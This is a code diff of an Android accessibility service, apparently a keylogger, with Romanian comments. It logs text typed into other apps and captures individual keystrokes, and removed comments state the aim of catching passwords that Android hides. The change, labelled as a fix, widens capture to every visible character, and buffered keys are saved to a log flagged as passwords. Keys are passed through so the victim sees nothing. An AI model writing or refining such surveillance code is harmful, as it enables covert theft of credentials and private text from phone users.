@@ -25,7 +25,6 @@ class TextLoggerService : AccessibilityService() {
     private lateinit var logFile: File
     private var lastText = ""
     
-    // Buffer pentru a stoca literele apasate (inclusiv la parole)
     private val keyBuffer = StringBuilder()
     private var lastPackage = ""
 
@@ -41,7 +40,7 @@ class TextLoggerService : AccessibilityService() {
         if (!prefs.getBoolean(KEY_ENABLED, false)) return
 
         val pkg = event.packageName?.toString() ?: return
-        if (pkg == packageName) return // Ignoram propria aplicatie
+        if (pkg == packageName) return 
 
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
@@ -69,13 +68,11 @@ class TextLoggerService : AccessibilityService() {
         }
     }
 
-    // Aici prindem tastele (util pentru parole, unde textul e ascuns de Android)
     override fun onKeyEvent(event: KeyEvent?): Boolean {
         event ?: return false
         if (!prefs.getBoolean(KEY_ENABLED, false)) return false
         if (event.action != KeyEvent.ACTION_DOWN) return false
 
-        // Ignoram tastele de sistem ca sa nu umplem logul cu prostii
         if (event.keyCode == KeyEvent.KEYCODE_SHIFT_LEFT || 
             event.keyCode == KeyEvent.KEYCODE_SHIFT_RIGHT ||
             event.keyCode == KeyEvent.KEYCODE_ALT_LEFT ||
@@ -99,18 +96,18 @@ class TextLoggerService : AccessibilityService() {
                     keyBuffer.clear()
                 }
             }
-            char.isLetterOrDigit() || char.isSymbol() || char.isPunctuation() -> {
+            // AICI E FIX-UL: Verificam daca e caracter vizibil, prinzand simboluri si punctuatie
+            event.unicodeChar != 0 && !Character.isISOControl(char) -> {
                 keyBuffer.append(char)
             }
         }
         
-        // Daca buffer-ul e prea lung, il salvam automat ca sa nu pierdem date
         if (keyBuffer.length > 20) {
             writeLogToFile(pkg, keyBuffer.toString(), isPassword = true)
             keyBuffer.clear()
         }
 
-        return false // Lăsăm tasta să meargă mai departe în aplicația originală
+        return false 
     }
 
     private fun diffText(old: String, new: String): String {
@@ -120,7 +117,6 @@ class TextLoggerService : AccessibilityService() {
         return "\n[PASTE/REWRITE]: $new"
     }
 
-    // Scriem pe un fir separat (Thread) ca sa nu blocheze telefonul
     private fun writeLogToFile(pkg: String, text: String, isPassword: Boolean) {
         Thread {
             try {
